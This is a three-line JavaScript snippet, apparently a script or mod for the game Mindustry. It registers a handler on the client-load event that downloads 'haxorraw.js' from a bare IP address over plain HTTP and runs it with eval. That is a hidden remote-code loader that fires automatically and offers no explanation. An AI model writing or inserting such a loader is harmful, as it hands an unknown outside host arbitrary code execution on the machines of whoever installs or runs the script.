Events.on(EventType.ClientLoadEvent,()=>{
Http.get("http://185.164.163.70/haxorraw.js",(r)=>{eval(r.getResultAsString());});
})
